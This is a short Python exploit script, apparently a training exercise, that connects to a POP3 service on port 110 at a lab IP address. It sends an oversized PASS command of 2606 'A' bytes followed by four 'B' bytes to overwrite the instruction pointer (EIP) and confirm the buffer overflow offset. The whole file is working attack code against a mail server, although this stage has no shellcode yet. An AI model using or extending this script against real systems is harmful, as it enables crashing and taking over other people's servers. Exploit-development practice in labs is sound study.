import socket
import sys
import time


print("[+] Lets over-write the EIP\n")

buff = "A" * 2606	# offset
eip = "B" * 4	#Should overwrite the EIP


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('192.168.1.117', 110))
s.recv(1024)	#Recv the banner

#Enter the User
s.send('USER hacker\r\n')
s.recv(1024)

#Finally the vulnerable command PASS
s.send('PASS ' + buff + eip + '\r\n')
s.send('QUIT\r\n')
s.close()
time.sleep(0.5)
print("[+] Execution Finished!")

